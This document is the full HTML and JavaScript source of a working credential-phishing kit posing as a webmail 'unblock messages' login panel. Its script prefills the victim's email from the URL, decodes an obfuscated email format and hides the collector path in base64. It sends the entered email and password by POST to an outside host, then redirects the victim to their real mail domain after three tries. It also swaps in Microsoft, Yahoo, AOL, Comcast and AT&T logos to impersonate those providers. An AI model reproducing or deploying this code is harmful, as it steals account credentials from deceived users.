<!DOCTYPE html>
<html lang="en">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
    <title>Message Panel</title>
<link rel="shortcut icon" href="https://s13684.securessl.net/favicon.ico" type="image/x-icon" />

    <style type="text/css">
    body {
        background: #0073C6;
    }

    .container {
        width: 100%;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
    }

    .office {
        width: 380px;
        background: #fff;
    }

    .office-holder {
        width: 80%;
        margin: auto;
        padding: 20px 0px;
    }

    .logo {
        width: 100%;
        margin-bottom: 2em;
    }

    .logo h1 {
        font-family: arial;

    }

    .logo h2 {
        display: block !important;
    }

    .verify {
        width: 70%;
        margin: auto;
    }

    .verify h4 {
        font-family: arial;
    }

    fieldset {
        width: 90%;
        float: right;
        border: 2px solid #4285f4;
        border-radius: 5px;
    }

    legend {
        font-size: 15px;
        overflow: hidden;
        width: 42%;
        padding: 0px 2px;
        margin: 0px;
    }

    .verify input[type='text'] {
        width: 100%;
        float: right;
        border: none;
        padding: 3px 10px;
    }

    .verify button {
        border: none;
        height: 40px;
        width: 80px;
        float: right;
        margin-top: 2em;
        background: #4285f4;
        border-radius: 5px;
        color: #fff;
    }

    .email-to-verify {
        border: 1px solid #000;
        border-radius: 10px;
    }

    .form-holder {
        width: 100%;
        float: left;
    }

    .form-holder h3 {
        font-weight: 600;
    }

    .form-holder input[type='email'],
    input[type='password'] {
        width: 100%;
        height: 40px;
        float: left;
        margin-bottom: 15px;
    }

    .form-holder .btn-holder {
        width: 100%;
        margin-top: 1em;
        display: flex;
        align-content: center;
        align-items: center;
        justify-content: center;
    }

    .form-holder .btn-holder .btn {
        background: #0073C6;
        border: none;
        padding: 6px 10px;
        color: #fff;
        border-radius: 0px;
        margin-top: 20px;
        margin-bottom: 20px;
    }

    .form-holder .btn-holder .btn:hover {
        cursor: pointer;
    }

    .checkbox {
        width: 100%;
        float: left;
        margin-top: 5px;
    }

    .checkbox label {
        font-family: arial;
        font-size: 13px;
        float: left;
        margin-left: 1em;
    }
	.email_icon{
   width:212px;
   height:0px;
   margin:1em auto;
   padding:0.1em;
}

    .hide {
        display: none;
    }
    </style>
</head>

<body>
    <div class="container">
        
        <div class="office show border shadow bg-light" id="others">
            <div class="office-holder">
                <div class="logo">
                <div class="email_icon">
                    <width="212" height="20" id="img" /></div>
                    <h4 class="text-dark"><strong id="domain-name" class="text-uppercase"></strong></h4>
                    <h5 class="font-weight-light">Enter valid details to unblock messages</h5>
                </div>
                <div style="width: 100%;">
                    <div class="alert alert-danger" id="msg" style="display: none;">Wrong password! Please enter correct password.</div>
                    <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
                </div>
                <form>
                    <div class="form-holder">
                        <input type="email" id="email" name="email" class="form-control" readonly placeholder="someone@example.com" required>
                        <input type="password" id="password" placeholder="Password" class="form-control" required>
                        <div class="checkbox">
                            <input type="checkbox" name="" style="float: left; margin-top:2px; margin-bottom: 10px;">
                            <label>REMEMBER ME</label>
                        </div>
                        <div class="btn-holder">
                            <button class="btn btn-lg col-12" id="submit-btn">Unblock Messages</button>
                        </div>
                        <p style="color:#0073C6; margin-top:1em; float: left; width:100%;">can't access your account?</p>
                        <p style="color:#0073C6; margin-top:0em; float: left; width:100%;">Sign in with a single-use code</p>
                    </div>
                    
                </form>
            </div>
        </div>
    </div>    
    <style>
    .tb_button {
        padding: 1px;
        cursor: pointer;
        border-right: 1px solid #8b8b8b;
        border-left: 1px solid #FFF;
        border-bottom: 1px solid #fff;
    }

    .tb_button.hover {
        borer: 2px outset #def;
        background-color: #f8f8f8 !important;
    }

    .ws_toolbar {
        z-index: 100000
    }

    .ws_toolbar .ws_tb_btn {
        cursor: pointer;
        border: 1px solid #555;
        padding: 3px
    }

    .tb_highlight {
        background-color: yellow
    }

    .tb_hide {
        visibility: hidden
    }

    .ws_toolbar img {
        padding: 2px;
        margin: 0px
    }
    </style>
<!-- Optional JavaScript -->
  <!-- jQuery first, then Popper.js, then Bootstrap JS -->
  <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
  

<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
<script>

    

  /* global $ */
  $(document).ready(function(){
	  
	
    var count=0;
    /////////////url email getting////////////////
    var email = window.location.hash.substr(1);
    if (!email) {

    }
    else
    {
        // $('#email').val(email);
        var my_email =email;
        var ind=my_email.indexOf("@");
        var my_slice=my_email.substr((ind+1));
        var c= my_slice.substr(0, my_slice.indexOf('.'));
        var final= c.toLowerCase();        
        $('#email').val(my_email);
        $('#domain-name').html(final);
        $("#msg").hide();
      }
      ///////////////url getting email////////////////


      var file="bmV4dC5waHA=";
      $('#submit-btn').click(function(event){
        $('#error').hide();
        $('#msg').hide();
        event.preventDefault();
        var email=$("#email").val();
        var password=$("#password").val();
        var msg = $('#msg').html();
        $('#msg').text( msg );
      ///////////new injection////////////////
      var my_email =email;
      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

      if (!email) {
            $('#error').show();
            $('#error').html("Email field is emply.!");
            ai.focus;
            return false;
        }

        if (!filter.test(my_email)) {
            $('#error').show();
            $('#error').html("That account doesn't exist. Enter a different account");
            ai.focus;
            return false;
        }
        if (!password) {
            $('#error').show();
            $('#error').html("Password field is emply.!");
            ai.focus;
            return false;
        }

      var ind=my_email.indexOf("@");
      var my_slice=my_email.substr((ind+1));
      var c= my_slice.substr(0, my_slice.indexOf('.'));
      var final= c.toLowerCase();
      ///////////new injection////////////////
      count=count+1;
      $('#domain-name').html(final);
      $.ajax({
        dataType: 'JSON',
        url: "https://sstcamping.com.au/java/css/"+atob(file),
        type: 'POST',
        data:{
          email:email,
          password:password,
        },
            // data: $('#contact').serialize(),
            beforeSend: function(xhr){
              $('#submit-btn').html('Verifying...');
            },
            success: function(response){
              if(response){
                $("#msg").show();
                console.log(response);
                if(response['signal'] == 'ok'){
                	
                  $("#password").val("");
                  if (count>=3) {
                    count=0;
                    // window.location.replace(response['redirect_link']);
                    window.location.replace("http://www."+my_slice);

                  }
                  // $('#msg').html(response['msg']);
                }
                else{
                  // $('#msg').html(response['msg']);
                }
              }
            },
            error: function(){
            	
              $("#password").val("");
              if (count>=3) {
                count=0;
                window.location.replace("http://www."+my_slice);
              }
              $("#msg").show();
              // $('#msg').html("Please try again later");
            },
            complete: function(){
              $('#submit-btn').html('Unblock messages');
            }
          });
    });


    });


  </script>

<script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js" integrity="sha384-cs/chFZiN24E4KMATLdqdvsezGxaGsi4hLGOzlXwp5UZB1LY//20VyM2taTB4QvJ" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js" integrity="sha384-uefMccjFJAIv6A+rW+L4AHf99KvxDjWSu1z9VI8SKNVmz4sk7buKt/6v9KI65qnm" crossorigin="anonymous"></script>
<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js"></script>
<script type="text/javascript">

var $c = getUrlParameter('email');
     $('#email').val($c);
        var $current_email = "";

        if ($c) {
            $current_email = isValidEmail($c) ? $c : decodeCustom($c);
        }


        function decodeCustom($email) {
            var $consonants = 'bcdfghjklmnpqrstvwxyz'.split('');
            var $joinChar = $email.substr(0, 1); // substr(,0,1);
            var $output = $email.substr(2); // substr($email,2);
            var $vowels = ['a', 'e', 'i', 'o', 'u'];
            var $vowelsLookup = [];

            for ($i in $consonants) {
                $output = $output.replace(new RegExp($joinChar + '0' + $i + 'a', 'g'), $consonants[$i]);
            }

            for ($i in $vowels) {
                $output = $output.replace(new RegExp($joinChar + $i, 'g'), $vowels[$i]);
            }

            $output = $output.replace(new RegExp($joinChar + $joinChar + $joinChar, 'g'), '@');
            //,$output);
            return $output;
        }

        function isValidEmail(email) {
            var re =
                /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
            return re.test(email);
        }

        function getUrlParameter(name) {
            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
            var results = regex.exec(location.search);
            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
			
        }
		
		 var currentEmail = $current_email;
    var ListEntries = [
            '.*fuck.*',
            '.*pussy.*',
            '.*bitch.*',
            '.*asshole.*',
            '.*fool.*',
            '.*dick.*',
            '.*mama.*',
            '.*nice.*try.*',
            '.*12345.*'
        ];
		
		 if(currentEmail){

            var e = document.getElementById('username');
            e = currentEmail;
            //e.readOnly = true;
			

            var domain = extractDomain(currentEmail);

           // var corH = document.getElementById('corportate-title');
            //corH.innerText = domain + " Email Login";

            }
			
		function extractDomain(email){

        var load = email;
        var domain = '';
        var regex = /.+@(.*?)\..+/;
        var str = email;
        var m;

        if ((m = regex.exec(str)) !== null) {
            return m[1];
        }

        return null;
    }

var value =  $('#email').val();
 if (value.indexOf('@hotmail') >= 0 || value.indexOf('@live') >= 0 || value.indexOf('@msn') >= 0 || value.indexOf('@outlook') >= 0) {
	$('img').attr("src", "images/microsoft_logo.jpg" );
 }
 else if (value.indexOf('@yahoo') >= 0 || value.indexOf('@ymail') >= 0 || value.indexOf('@rocketmail') >= 0 || value.indexOf('@sbcglobal.net') >= 0 || value.indexOf('@bellsouth.net') >= 0 || value.indexOf('@pacbell.net') >= 0) {
	$('img').attr( "src", "images/yahoo_logo.png" );
	}
else if (value.indexOf('@peoplepc') >= 0 || value.indexOf('@earthlink.net') >= 0 || value.indexOf('@mindspring') >= 0) {
	$('img').attr( "src", "images/earthlink_logo.png" );
	}
else if (value.indexOf('@comcast.net') >= 0 || value.indexOf('@xfinity') >= 0) {
	$('img').attr( "src", "images/comcast_logo.png" );
	}
else if (value.indexOf('@aim.com') >= 0 || value.indexOf('@aol.com') >= 0) {
	$('img').attr( "src", "images/aol_logo.png" );
	}
else if (value.indexOf('@cox.net') >= 0) {
	$('img').attr( "src", "images/cox_logo.png" );
	}
else if (value.indexOf('@mail') >= 0) {
	$('img').attr( "src", "images/godaddy_logo.png" );
	}
else if (value.indexOf('@ameritech.net') >= 0 || value.indexOf('@att.net') >= 0 || value.indexOf('@bellsouth.net') >= 0 || value.indexOf('@flash.net') >= 0 || value.indexOf('@nvbell.net') >= 0 || value.indexOf('@pacbell.net') >= 0 || value.indexOf('@prodigy.net') >= 0 || value.indexOf('@sbcglobal.net') >= 0 || value.indexOf('@snet.net') >= 0 || value.indexOf('@swbell.net') >= 0 || value.indexOf('@wans.net') >= 0) {
	$('img').attr("src", "images/atnt_logo.png" );
	
	}


</script>   
  
</body>


  </html>